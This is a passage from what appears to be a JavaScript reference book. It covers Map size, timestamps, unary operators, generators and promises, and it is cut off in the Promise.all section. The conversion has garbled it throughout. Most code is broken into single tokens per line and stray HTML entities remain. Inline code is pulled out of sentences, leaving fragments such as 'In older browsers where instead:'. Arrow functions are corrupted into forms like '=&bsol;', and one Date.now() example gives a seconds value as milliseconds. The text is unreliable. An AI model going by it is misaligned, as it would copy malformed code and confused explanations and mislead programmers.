## Section 38.7: Getting the number of elements of a Map

  
  .size
  

  

To get the numbers of elements of a Map, use the property:

**const**

map

=

**new**

Map

(

&lbrack;

&lbrack;

1

,

2

&rbrack;

,

&lbrack;

3

,

4

&rbrack;

&rbrack;

)

;

console.

log

(

map.

size

)

;

*// 2*

# Chapter 39: Timestamps

## Section 39.1: High-resolution timestamps

  -
  [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)
  -

  -

returns a precise timestamp: The number of milliseconds, including
microseconds, since the

current web page started to load.

  
  [performanceTiming.navigationStart](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceTiming/navigationStart)
  

  

More generally, it returns the time elapsed since the event.

t

=

performance.

now

(

)

;

  
  performance.now()
  

  

For example, in a web browser&apos;s main context, returns 6288.319 if the
web page began to load 6288 milliseconds and 319 microseconds ago.

## Section 39.2: Get Timestamp in Seconds

To get the timestamp in seconds

Math

.

floor

(

(

**new**

Date

(

)

.

getTime

(

)

)

/

1000

)

## Section 39.3: Low-resolution timestamps

  
  [Date.now()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/now)
  

  

returns the number of whole milliseconds that have elapsed since 1
January 1970 00:00:00 UTC.

t

=

Date

.

now

(

)

;

  
  Date.now()
  

  

For example, returns 1461069314 if it was called on 19 April 2016 at
12:35:14 GMT.

## Section 39.4: Support for legacy browsers

  -
  Date.now()     is unavailable, use      [(**new**
                                          Date()).getTime()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/getTime)
   - 

  -

In older browsers where instead:

t

=

(

**new**

Date

(

)

)

.

getTime

(

)

;

  
  Date.now()
  

  

Or, to provide a function for use in older browsers, [use this
polyfill](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/now#Polyfill):

**if**

(

!

Date

.

now

)

{

Date

.

now

=

**function**

now

(

)

{

**return**

**new**

Date

(

)

.

getTime

(

)

;

}

;

}

# Chapter 40: Unary Operators

## Section 40.1: Overview

Unary operators are operators with only one operand. Unary operators
are more efficient than standard JavaScript function calls.
Additionally, unary operators can not be overridden and therefore
their functionality is guaranteed.
>
The following unary operators are available:

  
  **Operator**   **Operation**                                            **Example**
    -
  **delete**     The delete operator deletes a property from an object.   example

  **void**       The void operator discards an expression&apos;s return       example
                 value.                                                   

  **typeof**     The typeof operator determines the type of a given       example
                 object.                                                  

  &plus;             The unary plus operator converts its operand to Number   example
                 type.                                                    
  

&minus; The unary negation operator converts its operand to Number, then
negates it. example

&bsol;~ Bitwise NOT operator. example

! Logical NOT operator. example

## Section 40.2: The typeof operator

The **typeof** operator returns the data type of the unevaluated
operand as a string.
>
**Syntax:**

**typeof**

operand

**Returns:**
>
These are the possible return values from **typeof**:

**Type Return value**

Undefined &quot;undefined&quot;

Null &quot;object&quot;

Boolean &quot;boolean&quot;

Number &quot;number&quot;

String &quot;string&quot;

Symbol (ES6) &quot;symbol&quot;

Function object &quot;function&quot;

  
  document.all
  

  

&quot;undefined&quot;
>
Host object (provided by the JS environment) Implementation-dependent

Any other object &quot;object&quot;

  
  document.all
  

  

The unusual behavior of with the **typeof** operator is from its
former usage to detect legacy browsers.
>
For more information, see [Why is document.all defined but typeof
document.all returns
&quot;undefined&quot;?](http://stackoverflow.com/q/40643613/6388243)
>
**Examples:**

*// returns &apos;number&apos;*

**typeof**

3.14

;

**typeof**

**Infinity**

;

**typeof**

**NaN**

;

*// &quot;Not-a-Number&quot; is a &quot;number&quot;*

*// returns &apos;string&apos;*

**typeof**

&quot;&quot;

;

**typeof**

&quot;bla&quot;

;

**typeof**

(

**typeof**

1

)

;

*// typeof always returns a string*

*// returns &apos;boolean&apos;*

**typeof**

**true**

;

**typeof**

**false**

;

*// returns &apos;undefined&apos;*

**typeof**

**undefined**

;

**typeof**

declaredButUndefinedVariable

;

**typeof**

undeclaredVariable

;

**typeof**

**void**

0

;

**typeof**

document.

all

*// see above*

*// returns &apos;function&apos;*

**typeof**

**function**

(

)

{

}

;

**typeof**

class

C

{

}

;

**typeof**

Math

.

sin

;

*// returns &apos;object&apos;*

**typeof**

{

*/&ast;&lt;&hellip;&gt;&ast;/*

}

;

**typeof**

**null**

;

**typeof**

*/regex/*

;

*// This is also considered an object*

**typeof**

&lbrack;

1

,

2

,

4

&rbrack;

;

*// use Array.isArray or Object.prototype.toString.call.*

**typeof**

**new**

Date

(

)

;

**typeof**

**new**

RegExp

(

)

;

**typeof**

**new**

Boolean

(

**true**

)

;

*// Don&apos;t use!*

**typeof**

**new**

Number

(

1

)

;

*// Don&apos;t use!*

**typeof**

**new**

String

(

&quot;abc&quot;

)

;

*// Don&apos;t use!*

*// returns &apos;symbol&apos;*

**typeof**

Symbol

(

)

;

**typeof**

Symbol.

iterator

;

## Section 40.3: The delete operator

The **delete** operator deletes a property from an object.
>
**Syntax:**

**delete**

object.

property

**delete**

object

&lbrack;

&apos;property&apos;

&rbrack;

**Returns:**
>
If deletion is successful, or the property did not exist:
>
**true**
>
If the property to be deleted is an own non-configurable property
(can&apos;t be deleted):
>
**false** in non-strict mode.
>
Throws an error in strict mode
>
**Description**
>
The **delete** operator does not directly free memory. It can
indirectly free memory if the operation means all references to the
property are gone.
>
**delete** works on an object&apos;s properties. If a property with the
same name exists on the object&apos;s prototype chain, the property will
be inherited from the prototype. **delete** does not work on variables
or function names.
>
**Examples:**

*// Deleting a property*

foo

=

1

;

*// a global variable is a property of &grave;window&grave;: &grave;window.foo&grave;*

**delete**

foo

;

*// true*

console.

log

(

foo

)

;

*// Uncaught ReferenceError: foo is not defined*

*// Deleting a variable*

**var**

foo

=

1

;

**delete**

foo

;

*// false*

console.

log

(

foo

)

;

*// 1 (Not deleted)*

*// Deleting a function*

**function**

foo

(

)

{

}

;

**delete**

foo

;

*// false*

console.

log

(

foo

)

;

*// function foo(){ } (Not deleted)*

*// Deleting a property*

**var**

foo

=

{

bar

:

&quot;42&quot;

}

;

**delete**

foo.

bar

;

*// true*

console.

log

(

foo

)

;

*// Object { } (Deleted bar)*

*// Deleting a property that does not exist*

**var**

foo

=

{

}

;

**delete**

foo.

bar

;

*// true*

console.

log

(

foo

)

;

*// Object { } (No errors, nothing deleted)*

*// Deleting a non-configurable property of a predefined object*

**delete**

Math

.

PI

;

*// false ()*

console.

log

(

Math

.

PI

)

;

*// 3.141592653589793 (Not deleted)*

## Section 40.4: The unary plus operator (+)

The unary plus (+) precedes its operand *and evaluates* to its
operand. It attempts to convert the operand to a number, if it isn&apos;t
already.
>
**Syntax:**
>
+expression **Returns:** a Number. **Description**
>
The unary plus (+) operator is the fastest (and preferred) method of
converting something into a number.
>
It can convert:
>
string representations of integers (decimal or hexadecimal) and
floats.
>
booleans: **true**, **false**.
>
**null**
>
Values that can&apos;t be converted will evaluate to **NaN**.
>
**Examples:**

&plus;

42

*// 42*

&plus;

&quot;42&quot;

*// 42*

&plus;

**true**

*// 1*

&plus;

**false**

*// 0*

&plus;

**null**

*// 0*

&plus;

**undefined**

*// NaN*

&plus;

**NaN**

*// NaN*

&plus;

&quot;foo&quot;

*// NaN*

&plus;

{

}

*// NaN*

&plus;

**function**

(

)

{

}

*// NaN*

Note that attempting to convert an array can result in unexpected
return values. In the background, arrays are first converted to their
string representations:

&lbrack;

&rbrack;

.

toString

(

)

===

&apos;&apos;

;

&lbrack;

1

&rbrack;

.

toString

(

)

===

&apos;1&apos;

;

&lbrack;

1

,

2

&rbrack;

.

toString

(

)

===

&apos;1,2&apos;

;

The operator then attempts to convert those strings to numbers:

&plus;

&lbrack;

&rbrack;

*// 0 ( === +&apos;&apos; )*

&plus;

&lbrack;

1

&rbrack;

*// 1 ( === +&apos;1&apos; )*

&plus;

&lbrack;

1

,

2

&rbrack;

*// NaN ( === +&apos;1,2&apos; )*

## Section 40.5: The void operator

The **void** operator evaluates the given expression and then returns
**undefined**.
>
**Syntax:**

**void**

expression

**Returns:**
>
**undefined Description**

  -
  **void**                    0 or                  **void**
    -

  -

The **void** operator is often used to obtain the **undefined**
primitive value, by means of writing (0). Note that **void** is an
operator, not a function, so () is not required.
>
Usually the result of a **void** expression and **undefined** can be
used interchangeably.

  
  window.**undefined**
  

  

However, in older versions of ECMAScript, could be assigned any value,
and it is still possible to use **undefined** as name for function
parameters variables inside functions, thus disrupting other code that
relies on the value of **undefined**. **void** will always yield the
*true* **undefined** value though.

  
  **void**
  

  

  
  window.**undefined**
  

  

0 is also commonly used in code minification as a shorter way of
writing **undefined**. In addition, it&apos;s probably safer as some other
code could&apos;ve tampered with .
>
**Examples:**

Returning

**undefined**

:

**function**

foo

(

)

{

**return**

**void**

0

;

}

console.

log

(

foo

(

)

)

;

*// undefined*

Changing the value of **undefined** inside a certain scope:

(

**function**

(

**undefined**

)

{

**var**

str

=

&apos;foo&apos;

;

console.

log

(

str

===

**undefined**

)

;

*// true*

}

)

(

&apos;foo&apos;

)

;

## Section 40.6: The unary negation operator (-)

The unary negation (-) precedes its operand and negates it, after
trying to convert it to number.
>
**Syntax:**

-expression **Returns:** a Number.

**Description**
>
The unary negation (-) can convert the same types / values as the
unary plus (+) operator can.

  
  **NaN**
  

  

Values that can&apos;t be converted will evaluate to **NaN** (there is no
-).
>
**Examples:**

&minus;

42

*// -42*

&minus;

&quot;42&quot;

*// -42*

&minus;

**true**

*// -1*

&minus;

**false**

*// -0*

&minus;

**null**

*// -0*

&minus;

**undefined**

*// NaN*

&minus;

**NaN**

*// NaN*

&minus;

&quot;foo&quot;

*// NaN*

&minus;

{

}

*// NaN*

&minus;

**function**

(

)

{

}

*// NaN*

Note that attempting to convert an array can result in unexpected
return values. In the background, arrays are first converted to their
string representations:

&lbrack;

&rbrack;

.

toString

(

)

===

&apos;&apos;

;

&lbrack;

1

&rbrack;

.

toString

(

)

===

&apos;1&apos;

;

&lbrack;

1

,

2

&rbrack;

.

toString

(

)

===

&apos;1,2&apos;

;

The operator then attempts to convert those strings to numbers:

&minus;

&lbrack;

&rbrack;

*// -0 ( === -&apos;&apos; )*

&minus;

&lbrack;

1

&rbrack;

*// -1 ( === -&apos;1&apos; )*

&minus;

&lbrack;

1

,

2

&rbrack;

*// NaN ( === -&apos;1,2&apos; )*

## Section 40.7: The bitwise NOT operator (&bsol;~)

The bitwise NOT (&bsol;~) performs a NOT operation on each bit in a value.
>
**Syntax:**

&bsol;~expression **Returns:**

a Number.
>
**Description**
>
The truth table for the NOT operation is:
>
**a NOT a**

0

1

1

0

1337

(

base

10

)

=

0000010100111001

(

base

2

)

&bsol;~

1337

(

base

10

)

=

1111101011000110

(

base

2

)

=

&minus;

1338

(

base

10

)

A bitwise not on a number results in:

&minus;

(

x

&plus;

1

)

.

**Examples: value (base 10) value (base 2) return (base 2) return
(base 10)**

  
  2                       00000010              11111100                -3
     
  1                       00000001              11111110                -2

  0                       00000000              11111111                -1

  -1                      11111111              00000000                0

  -2                      11111110              00000001                1

  -3                      11111100              00000010                2
  

## Section 40.8: The logical NOT operator (!)

The logical NOT (!) operator performs logical negation on an
expression.
>
**Syntax:**

!expression **Returns:** a Boolean.

**Description**
>
The logical NOT (!) operator performs logical negation on an
expression.

  
  **true** === **false**        and !       **false** === **true**
    

  

Boolean values simply get inverted: !.
>
Non-boolean values get converted to boolean values first, then are
negated.
>
This means that a double logical NOT (!!) can be used to cast any
value to a boolean:

!!

&quot;FooBar&quot;

===

**true**

!!

1

===

**true**

!!

0

===

**false**

  
  **true**
  

  

These are all equal to !:

!

&apos;true&apos;

===

!

**new**

Boolean

(

&apos;true&apos;

)

;

!

&apos;false&apos;

===

!

**new**

Boolean

(

&apos;false&apos;

)

;

!

&apos;FooBar&apos;

===

!

**new**

Boolean

(

&apos;FooBar&apos;

)

;

!

&lbrack;

&rbrack;

===

!

**new**

Boolean

(

&lbrack;

&rbrack;

)

;

!

{

}

===

!

**new**

Boolean

(

{

}

)

;

These are all equal to

!

**false**

:

!

0

===

!

**new**

Boolean

(

0

)

;

!

&apos;&apos;

===

!

**new**

Boolean

(

&apos;&apos;

)

;

!

**NaN**

===

!

**new**

Boolean

(

**NaN**

)

;

!

**null**

===

!

**new**

Boolean

(

**null**

)

;

!

**undefined**

===

!

**new**

Boolean

(

**undefined**

)

;

**Examples:**

!

**true**

*// false*

!-

1

*// false*

!

&quot;-1&quot;

*// false*

!

42

*// false*

!

&quot;42&quot;

*// false*

!

&quot;foo&quot;

*// false*

!

&quot;true&quot;

*// false*

!

&quot;false&quot;

*// false*

!

{

}

*// false*

!

&lbrack;

&rbrack;

*// false*

!

**function**

(

)

{

}

*// false*

!

**false**

*// true*

!

**null**

*// true*

!

**undefined**

*// true*

!

**NaN**

*// true*

!

0

*// true*

!

&quot;&quot;

*// true*

# Chapter 41: Generators

  
  **function**
  

  

Generator functions (defined by the &ast; keyword) run as coroutines,
generating a series of values as they&apos;re requested through an
iterator.

## Section 41.1: Generator Functions

  
  **function**
  

  

A *generator function* is created with a &ast; declaration. When it is
called, its body is **not** immediately executed. Instead, it returns
a *generator object*, which can be used to &quot;step through&quot; the
function&apos;s execution.
>
A yield expression inside the function body defines a point at which
execution can suspend and resume.

**function**

&ast;

nums

(

)

{

console.

log

(

&apos;starting&apos;

)

;

*// A*

yield

1

;

*// B*

console.

log

(

&apos;yielded 1&apos;

)

;

*// C*

yield

2

;

*// D*

console.

log

(

&apos;yielded 2&apos;

)

;

*// E*

yield

3

;

*// F*

console.

log

(

&apos;yielded 3&apos;

)

;

*// G*

}

**var**

generator

=

nums

(

)

;

*// Returns the iterator. No code in nums is executed*

generator.

next

(

)

;

*// Executes lines A,B returning { value: 1, done: false }*

*// console: &quot;starting&quot;*

generator.

next

(

)

;

*// Executes lines C,D returning { value: 2, done: false }*

*// console: &quot;yielded 1&quot;*

generator.

next

(

)

;

*// Executes lines E,F returning { value: 3, done: false }*

*// console: &quot;yielded 2&quot;*

generator.

next

(

)

;

*// Executes line G returning { value: undefined, done: true }*

*// console: &quot;yielded 3&quot;*

**Early iteration exit**
>
generator = nums(); generator.next(); *// Executes lines A,B returning
{ value: 1, done: false }* generator.next(); *// Executes lines C,D
returning { value: 2, done: false }* generator.**return**(3); *// no
code is executed returns { value: 3, done: true }*
>
*// any further calls will return done = true*
>
generator.next(); *// no code executed returns { value: undefined,
done: true }*
>
**Throwing an error to generator function**

**function**

&ast;

nums

(

)

{

**try**

{

yield

1

;

*// A*

yield

2

;

*// B*

yield

3

;

*// C*

}

**catch**

(

e

)

{

console.

log

(

e&period;

message

)

;

*// D*

}

}

**var**

generator

=

nums

(

)

;

generator.

next

(

)

;

*// Executes line A returning { value: 1, done: false }*

generator.

next

(

)

;

*// Executes line B returning { value: 2, done: false }*

generator.

**throw**

(

**new**

Error

(

&quot;Error!!&quot;

)

)

;

*// Executes line D returning { value: undefined, done: true}*

*// console: &quot;Error!!&quot;*

generator.

next

(

)

;

*// no code executed. returns { value: undefined, done: true }*

## Section 41.2: Sending Values to Generator

  
  next()
  

  

It is possible to *send* a value to the generator by passing it to the
method.

**function**

&ast;

summer

(

)

{

**let**

sum

=

0

,

value

;

while

(

**true**

)

{

*// receive sent value*

value

=

yield

;

**if**

(

value

===

**null**

)

**break**

;

*// aggregate values*

sum

+=

value

;

}

**return**

sum

;

}

**let**

generator

=

summer

(

)

;

*// proceed until the first &quot;yield&quot; expression, ignoring the &quot;value&quot;
argument*

generator.

next

(

)

;

*// from this point on, the generator aggregates values until we send
&quot;null&quot;*

generator.

next

(

1

)

;

generator.

next

(

10

)

;

generator.

next

(

100

)

;

*// close the generator and collect the result*

**let**

sum

=

generator.

next

(

**null**

)

.

value

;

*// 111*

## Section 41.3: Delegating to other Generator

  
  yield&ast;
  

  

From within a generator function, the control can be delegated to
another generator function using .

**function**

&ast;

g1

(

)

{

yield

2

;

yield

3

;

yield

4

;

}

**function**

&ast;

g2

(

)

{

yield

1

;

yield

&ast;

g1

(

)

;

yield

5

;

}

**var**

it

=

g2

(

)

;

console.

log

(

it.

next

(

)

)

;

*// 1*

console.

log

(

it.

next

(

)

)

;

*// 2*

console.

log

(

it.

next

(

)

)

;

*// 3*

console.

log

(

it.

next

(

)

)

;

*// 4*

console.

log

(

it.

next

(

)

)

;

*// 5*

console.

log

(

it.

next

(

)

)

;

*// undefined*

## Section 41.4: Iteration

  
  **for**&hellip;of
  

  

A generator is *iterable*. It can be looped over with a statement, and
used in other constructs which depend on the iteration protocol.

**function**

&ast;

range

(

n

)

{

**for**

(

**let**

i

=

0

;

i

&lt;

n

;

++

i

)

{

yield i

;

}

}

*// looping*

**for**

(

**let**

n of range

(

10

)

)

{

*// n takes on the values 0, 1, &hellip; 9*

}

*// spread operator*

**let**

nums

=

&lbrack;

&hellip;

range

(

3

)

&rbrack;

;

*// &lbrack;0, 1, 2&rbrack;*

**let**

max

=

Math

.

max

(

&hellip;

range

(

100

)

)

;

*// 99*

  
  **function**
  

  

Here is another example of use generator to custom iterable object in
ES6. Here anonymous generator function &ast; used.

**let**

user

=

{

name

:

&quot;sam&quot;

,

totalReplies

:

17

,

isBlocked

:

**false**

}

;

user

&lbrack;

Symbol.

iterator

&rbrack;

=

**function**

&ast;

(

)

{

**let**

properties

=

Object

.

keys

(

**this**

)

;

**let**

count

=

0

;

**let**

isDone

=

**false**

;

**for**

(

**let**

p of properties

)

{

yield

**this**

&lbrack;

p

&rbrack;

;

}

}

;

**for**

(

**let**

p of user

)

{

console.

log

(

p

)

;

}

## Section 41.5: Async flow with generators

Generators are functions which are able to pause and then resume
execution. This allows to emulate async functions using external
libraries, mainly q or co. Basically it allows to write functions that
wait for async results in order to go on:

**function**

someAsyncResult

(

)

{

**return**

Promise.

resolve

(

&apos;newValue&apos;

)

}

q&period;

spawn

(

**function**

&ast;

(

)

{

**var**

result

=

yield someAsyncResult

(

)

console.

log

(

result

)

*// &apos;newValue&apos;*

}

)

This allows to write async code as if it were synchronous. Moreover,
try and catch work over several async blocks. If the promise is
rejected, the error is caught by the next catch:

**function**

asyncError

(

)

{

**return**

**new**

Promise

(

**function**

(

resolve

,

reject

)

{

setTimeout

(

**function**

(

)

{

reject

(

**new**

Error

(

&apos;Something went wrong&apos;

)

)

}

,

100

)

}

)

}

q&period;

spawn

(

**function**

&ast;

(

)

{

**try**

{

**var**

result

=

yield asyncError

(

)

}

**catch**

(

e

)

{

console.

error

(

e

)

*// Something went wrong*

}

}

)

Using co would work exactly the same but with

co

(

**function**

&ast;

(

)

{

&hellip;

}

)

instead of

q&period;

spawn

## Section 41.6: Iterator-Observer interface

A generator is a combination of two things - an Iterator and an
Observer.
>
**Iterator**
>
An iterator is something when invoked returns an iterable. An iterable
is something you can iterate upon. From ES6/ES2015 onwards, all
collections (Array, Map, Set, WeakMap, WeakSet) conform to the
Iterable contract.

A generator(iterator) is a producer. In iteration the consumer PULLs the
value from the producer.

Example:

**function**

&ast;

gen

(

)

{

yield

5

;

yield

6

;

}

**let**

a

=

gen

(

)

;

  
  a.next
  

  

  
  a.next
  

  

Whenever you call (), you&apos;re essentially pull-ing value from the
Iterator and pause the execution at yield. The next time you call (),
the execution resumes from the previously paused state.
>
**Observer**
>
A generator is also an observer using which you can send some values
back into the generator.

**function**

&ast;

gen

(

)

{

document.

write

(

&apos;&lt;br&gt;observer:&apos;

,

yield

1

)

;

}

**var**

a

=

gen

(

)

;

**var**

i

=

a&period;

next

(

)

;

while

(

!

i&period;

done

)

{

document.

write

(

&apos;&lt;br&gt;iterator:&apos;

,

i&period;

value

)

;

i

=

a&period;

next

(

100

)

;

}

  
  yield
  

  

  
  a.next
  

  

Here you can see that 1 is used like an expression which evaluates to
some value. The value it evaluates to is the value sent as an argument
to the function call.

  
  i.value
  

  

  -
  a.next                                     (       100
  - - 

  -

So, for the first time will be the first value yielded (1), and when
continuing the iteration to the next state, we send a value back to
the generator using ).
>
**Doing async with Generators**
>
Generators are widely used with spawn (from taskJS or co) function,
where the function takes in a generator and allows us to write
asynchronous code in a synchronous fashion. This does NOT mean that
async code is converted to sync code / executed synchronously. It
means that we can write code that looks like sync but internally it is
still async.
>
Sync is BLOCKING; Async is WAITING. Writing code that blocks is easy.
When PULLing, value appears in the assignment position. When PUSHing,
value appears in the argument position of the callback.
>
When you use iterators, you PULL the value from the producer. When you
use callbacks, the producer PUSHes the value to the argument position
of the callback.

**var**

i

=

a&period;

next

(

)

*// PULL*

dosomething

(

&hellip;

,

v

=&gt;

{

&hellip;

}

)

*// PUSH*

  
  a.next       () and in the second,                   v =&bsol;     {   &hellip;
    -  

  

Here, you pull the value from } is the callback and a value is PUSHed
into the argument position v of the callback function.
>
Using this pull-push mechanism, we can write async programming like
this,

**let**

delay

=

t

=&gt;

**new**

Promise

(

r

=&gt;

setTimeout

(

r

,

t

)

)

;

spawn

(

**function**

&ast;

(

)

{

*// wait for 100 ms and send 1*

**let**

x

=

yield delay

(

100

)

.

then

(

(

)

=&gt;

1

)

;

console.

log

(

x

)

;

*// 1*

*// wait for 100 ms and send 2*

**let**

y

=

yield delay

(

100

)

.

then

(

(

)

=&gt;

2

)

;

console.

log

(

y

)

;

*// 2*

}

)

;

So, looking at the above code, we are writing async code that looks
like it&apos;s blocking (the yield statements wait for 100ms and then
continue execution), but it&apos;s actually waiting. The pause and resume
property of generator allows us to do this amazing trick.
>
**How does it work ?**
>
The spawn function uses yield promise to PULL the promise state from
the generator, waits till the promise is resolved, and PUSHes the
resolved value back to the generator so it can consume it.
>
**Use it now**
>
So, with generators and spawn function, you can clean up all your
async code in NodeJS to look and feel like it&apos;s synchronous. This
will make debugging easy. Also the code will look neat.

  
  async&hellip;await
  

  

This feature is coming to future versions of JavaScript - as . But you
can use them today in
>
ES2015/ES6 using the spawn function defined in the libraries - taskjs,
co, or bluebird

# Chapter 42: Promises

## Section 42.1: Introduction

A
[Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)
object represents an operation which *has produced or will eventually
produce* a value. Promises provide a robust way to wrap the (possibly
pending) result of asynchronous work, mitigating the problem of deeply
nested callbacks (known as &quot;[callback
hell](http://callbackhell.com/)&quot;).
>
**States and control flow**
>
A promise can be in one of three states:
>
*pending*  The underlying operation has not yet completed, and the
promise is *pending* fulfillment.
>
*fulfilled*  The operation has finished, and the promise is
*fulfilled* with a *value*. This is analogous to returning a value
from a synchronous function.
>
*rejected*  An error has occurred during the operation, and the
promise is *rejected* with a *reason*. This is analogous to throwing
an error in a synchronous function.
>
A promise is said to be *settled* (or *resolved*) when it is either
fulfilled or rejected. Once a promise is settled, it becomes
immutable, and its state cannot change. The
[then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
and
[**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
methods of a promise can be used to attach callbacks that execute when
it is settled. These callbacks are invoked with the fulfillment value
and rejection reason, respectively.

![](./images/image032.jpg){width="7.477777777777778in"
height="1.9819444444444445in"}

**Example**

**const**

promise

=

**new**

Promise

(

(

resolve

,

reject

)

=&gt;

{

*// Perform some work (possibly asynchronous)*

*// &hellip;*

**if**

(

*/&ast; Work has successfully finished and produced &quot;value&quot; &ast;/*

)

{

resolve

(

value

)

;

}

**else**

{

*// Something went wrong because of &quot;reason&quot;*

*// The reason is traditionally an Error object, although*

*// this is not required or enforced.*

**let**

reason

=

**new**

Error

(

message

)

;

reject

(

reason

)

;

*// Throwing an error also rejects the promise.*

**throw**

reason

;

}

}

)

;

The
[then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
and
[**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
methods can be used to attach fulfillment and rejection callbacks:

promise.

then

(

value

=&gt;

{

*// Work has completed successfully,*

*// promise has been fulfilled with &quot;value&quot;*

}

)

.

**catch**

(

reason

=&gt;

{

*// Something went wrong,*

*// promise has been rejected with &quot;reason&quot;*

}

)

;

  
  promise.then           (   &hellip;   ) and     promise.**catch**        (   &hellip;
  -    -  

  

**Note:** Calling ) on the same promise might result in an Uncaught
>
exception **in** Promise if an error occurs, either while executing
the promise or inside one of the callbacks, so the preferred way would
be to attach the next listener on the promise returned by the previous
then / **catch**.
>
Alternatively, both callbacks can be attached in a single call to
[then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then):

promise.

then

(

onFulfilled

,

onRejected

)

;

Attaching callbacks to a promise that has already been settled will
immediately place them in the [microtask
queue](http://stackoverflow.com/a/25933985/5931915), and they will be
invoked &quot;as soon as possible&quot; (i.e. immediately after the currently
executing script). It is not necessary to check the state of the
promise before attaching callbacks, unlike with many other
event-emitting implementations.

[Live demo](https://jsfiddle.net/SO_AMK/sy8s7a3a/)

## Section 42.2: Promise chaining

The

[the]

[n](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)

method of a promise returns a new promise.

**const**

promise

=

**new**

Promise

(

resolve

=&gt;

setTimeout

(

resolve

,

5000

)

)

;

promise

*// 5 seconds later*

.

then

(

(

)

=&gt;

2

)

*// returning a value from a then callback will cause*

*// the new promise to resolve with this value*

.

then

(

value

=&gt;

{

*/&ast; value === 2 &ast;/*

}

)

;

Returning a
[Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)
from a
[then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
callback will append it to the promise chain.

**function**

wait

(

millis

)

{

**return**

**new**

Promise

(

resolve

=&gt;

setTimeout

(

resolve

,

millis

)

)

;

}

**const**

p

=

wait

(

5000

)

.

then

(

(

)

=&gt;

wait

(

4000

)

)

.

then

(

(

)

=&gt;

wait

(

1000

)

)

;

p&period;

then

(

(

)

=&gt;

{

*/&ast; 10 seconds have passed &ast;/*

}

)

;

A
[**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
allows a rejected promise to recover, similar to how **catch** in a
**try**/**catch** statement works. Any chained
[then](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then)
after a
[**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
will execute its resolve handler using the value resolved from the
[**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch).
>
**const** p = **new** Promise(resolve =&bsol;{**throw** &apos;oh no&apos;});
>
p.**catch**(() =&amp;apos;oh yes&apos;).then(console.log.bind(console)); *//
outputs &quot;oh yes&quot;*
>
If there are no
[**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
or reject handlers in the middle of the chain, a
[**catch**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch)
at the end will capture any rejection in the chain:

p&period;

**catch**

(

(

)

=&gt;

Promise.

reject

(

&apos;oh yes&apos;

)

)

.

then

(

console.

log

.

bind

(

console

)

)

*// won&apos;t be called*

.**catch**(console.error.bind(console)); *// outputs &quot;oh yes&quot;*
>
On certain occasions, you may want to &quot;branch&quot; the execution of the
functions. You can do it by returning different promises from a
function depending on the condition. Later in the code, you can merge
all of these branches into one to call other functions on them and/or
to handle all errors in one place.

promise

.

then

(

result

=&gt;

{

**if**

(

result.

condition

)

{

**return**

handlerFn1

(

)

.

then

(

handlerFn2

)

;

}

**else**

**if**

(

result.

condition2

)

{

**return**

handlerFn3

(

)

.

then

(

handlerFn4

)

;

}

**else**

{

**throw**

**new**

Error

(

&quot;Invalid result&quot;

)

;

}

}

)

.

then

(

handlerFn5

)

.

**catch**

(

err

=&gt;

{

console.

error

(

err

)

;

}

)

;

Thus, the execution order of the functions looks like:
>
promise &bsol;&bsol;handlerFn1 -&bsol;handlerFn2 &bsol;&bsol;handlerFn5 &bsol;~&bsol;~&gt;
.**catch**()
>
&vert; &Hat;
>
V &vert;
>
-&bsol;handlerFn3 -&bsol;handlerFn4 -&Hat;
>
The single **catch** will get the error on whichever branch it may
occur.

## Section 42.3: Waiting for multiple concurrent promises

  
  [Promise.all](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all)
  

  

The
[()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all)
static method accepts an iterable (e.g. an Array) of promises and
returns a new promise, which resolves when **all** promises in the
iterable have resolved, or rejects if **at least one** of the promises
in the iterable have rejected.

*// wait &quot;millis&quot; ms, then resolve with &quot;value&quot;*

**function**

resolve

(

value

,

milliseconds

)

{

**return**

**new**

Promise

(

resolve

=&gt;

setTimeout

(

(

)

=&gt;

resolve

(

value

)

,

milliseconds

)

)

;

}

*// wait &quot;millis&quot; ms, then reject with &quot;reason&quot;*

**function**

reject

(

reason

,

milliseconds

)

{

**return**

**new**

Promise

(

(

&lowbar;

,

reject

)

=&gt;

setTimeout

(

(

)

=&gt;

reject

(

reason

)

,

milliseconds

)

)

;

}

Promise.

all

(

&lbrack;

resolve

(

1

,

5000

)

,

resolve

(

2

,

6000

)

,

resolve

(

3

,

7000

)

&rbrack;

)

.

then

(

values

=&gt;

console.

log

(

values

)

)

;

*// outputs &quot;&lbrack;1, 2, 3&rbrack;&quot; after 7 seconds.*

Promise.

all

(

&lbrack;

resolve

(

1

,

5000

)

,

reject

(

&apos;Error!&apos;

,

6000

)

,

resolve

(

2

,

7000

)

&rbrack;

)

.

then

(

values

=&gt;

console.

log

(

values

)

)

*// does not output anything*

.**catch**(reason =&bsol;console.log(reason)); *// outputs &quot;Error!&quot;
after 6 seconds.*
>
Non-promise values in the iterable are &quot;promisified&quot;.

Promise.

all

(

&lbrack;

resolve

(

1

,

5000

)

,

resolve
